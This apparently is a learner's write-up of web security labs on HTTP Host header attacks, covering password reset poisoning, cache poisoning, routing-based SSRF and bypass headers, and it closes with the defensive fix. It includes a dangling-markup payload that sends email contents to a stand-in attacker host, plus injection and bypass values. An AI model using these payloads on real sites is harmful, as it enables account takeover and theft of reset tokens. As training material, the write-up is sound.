# HTTP Host Header Attacks

## What is the Host header

The HTTP Host header is a mandatory header in HTTP/1.1. It tells the server which domain the request is intended for, which became necessary once multiple websites started sharing the same IP address. Without it, the server would have no way to determine which virtual host should handle the request.

The vulnerability arises when applications use the Host header value in sensitive operations without validating it. Since the header is user-controlled, an attacker can supply an arbitrary value and the server will often trust it.

## Labs completed

- Basic password reset poisoning (Apprentice)
- Host header authentication bypass (Apprentice)
- Web cache poisoning via ambiguous requests (Practitioner)
- Routing-based SSRF (Practitioner)
- SSRF via flawed request parsing (Practitioner)
- Host validation bypass via connection state attack (Practitioner)
- Password reset poisoning via dangling markup (Expert)

## Main attack vectors

**Password reset poisoning** is the most common and impactful variant. The application builds a password reset link using the Host header and sends it to the victim by email. If the attacker intercepts the request and substitutes their own server in the Host header, the victim's reset token arrives at the attacker's server when the victim clicks the link.

**Host header authentication bypass** occurs when internal admin panels restrict access by checking whether the Host header equals localhost or an internal hostname. Substituting the correct value in Burp bypasses the restriction entirely, since there is no real authentication behind it.

**Web cache poisoning via ambiguous requests** exploits the discrepancy between how the cache and the backend interpret multiple Host headers. The cache keys the response on the first Host header while the backend uses the second to generate content. An attacker injects a malicious value in the second header, and the poisoned response gets served to other users from cache.

**Routing-based SSRF** targets infrastructure where a load balancer or reverse proxy routes requests to internal servers based on the Host header. Replacing the Host with an internal IP forces the proxy to forward the request to that address, effectively turning the proxy into an SSRF vector.

**SSRF via flawed request parsing** is a variant where the server only validates the Host header when the request line contains a relative path. Switching to an absolute URL in the request line disables that validation, and the Host header can then be set to any internal IP for routing purposes.

**Host validation bypass via connection state attack** exploits the fact that some front-end servers only validate the Host header on the first request in a keep-alive TCP connection. Sending a legitimate first request establishes trust, and a second request in the same connection with a malicious Host value bypasses validation entirely.

**Password reset poisoning via dangling markup** applies when standard Host injection is blocked but the value still gets reflected in an email. Injecting an unclosed HTML tag such as `<a href="https://attacker.com/?` causes the victim's email client to treat the rest of the email body as a URL parameter and send it to the attacker's server as a GET request. If the email contains a plaintext password or token, it leaks in the access log.

## Bypass techniques

When direct Host header manipulation is blocked, several alternative headers are worth trying: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, and `Forwarded: host=`. Some servers accept these as overrides. Duplicate Host headers are also worth testing since different components may pick the first or the last value. Appending a port with a malicious payload such as `Host: legit.com:evil.com` can sometimes confuse parsers.

## Testing approach in Burp

Send every sensitive request through Repeater and check whether the Host value appears anywhere in the response, particularly inside script sources, link hrefs, or redirect targets. For out-of-band confirmation, replace the Host with a Burp Collaborator URL and check for DNS and HTTP pingbacks. When testing password reset flows, always set `username=carlos` rather than your own account and monitor the exploit server access log for incoming tokens. For internal network enumeration, use Intruder with a numeric payload on the last octet of a private IP range and disable the "Update Host header to match target" option.

## Key takeaway

The Host header is a user-controlled input that many applications treat as trusted. Any operation that uses it to build URLs, route requests, or generate emails is a potential vulnerability. The fix is always to hardcode the expected domain in server-side configuration rather than reading it from the incoming request.ming request.
